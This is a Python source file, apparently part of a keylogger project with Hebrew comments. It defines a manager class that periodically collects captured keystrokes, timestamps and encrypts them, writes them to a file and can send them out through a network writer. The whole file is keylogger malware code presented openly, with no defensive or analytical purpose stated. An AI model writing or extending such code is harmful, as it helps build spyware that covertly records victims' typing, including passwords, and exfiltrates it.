import threading
import time
from datetime import datetime

class KeyLoggerManager:
    def __init__(self, keylogger_service, file_writer, encryptor, interval=5, network_writer=None):
        self.keylogger_service = keylogger_service
        self.file_writer = file_writer
        self.encryptor = encryptor
        self.network_writer = network_writer
        self.interval = interval
        self.running = False
        self.buffer = []
        self.thread = None

    def start(self):
        self.running = True
        self.keylogger_service.start_logging()
        self.thread = threading.Thread(target=self._run)
        self.thread.start()

    def stop(self):
        self.running = False
        self.keylogger_service.stop_logging()
        if self.thread:
            self.thread.join()
        self._flush_buffer()  # לשמור את מה שנשאר בבאפר

    def _run(self):
        while self.running:
            time.sleep(self.interval)
            self._collect_keys()
            self._flush_buffer()

    def _collect_keys(self):
        keys = self.keylogger_service.get_logged_keys()
        if keys:
            self.buffer.extend(keys)

    def _flush_buffer(self):
        if not self.buffer:
            return

        # ליצור מחרוזת עם חותמת זמן
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f"[{timestamp}] " + "".join(self.buffer)

        # הצפנה
        encrypted_data = self.encryptor.encrypt(data)

        # כתיבה לקובץ
        self.file_writer.write(encrypted_data)

        # אופציונלי: שליחה לרשת
        if self.network_writer:
            self.network_writer.send(encrypted_data)

        # לרוקן את הבאפר
        self.buffer.clear()
